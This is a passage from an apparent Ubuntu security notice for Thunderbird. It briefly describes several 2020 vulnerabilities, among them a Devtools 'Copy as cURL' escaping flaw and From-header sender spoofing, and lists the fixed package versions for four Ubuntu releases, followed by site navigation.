or execute arbitrary code. ([CVE-2020-6831](/security/CVE-2020-6831), [CVE-2020-12387](/security/CVE-2020-12387), [CVE-2020-12395](/security/CVE-2020-12395))

It was discovered that the Devtools’ ‘Copy as cURL’ feature did not

properly escape the HTTP POST data of a request. If a user were tricked

in to using the ‘Copy as cURL’ feature to copy and paste a command with

specially crafted data in to a terminal, an attacker could potentially

exploit this to obtain sensitive information from local files.

([CVE-2020-12392](/security/CVE-2020-12392))

It was discovered that Thunderbird did not correctly handle Unicode

whitespace characters within the From email header. An attacker could

potentially exploit this to spoof the sender email address that

Thunderbird displays. ([CVE-2020-12397](/security/CVE-2020-12397))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 20.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.20.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.20.04.2)

##### Ubuntu 19.10

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.19.10.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.19.10.2)

##### Ubuntu 18.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.18.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.18.04.2)

##### Ubuntu 16.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.8.0+build2-0ubuntu0.16.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.8.0%2Bbuild2-0ubuntu0.16.04.2)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2020-6831](/security/CVE-2020-6831)
* [CVE-2020-12387](/security/CVE-2020-12387)
* [CVE-2020-12392](/security/CVE-2020-12392)
* [CVE-2020-12395](/security/CVE-2020-12395)
* [CVE-2020-12397](/security/CVE-2020-12397)

## Related notices

* [USN-4353-1](/security/notices/USN-4353-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page


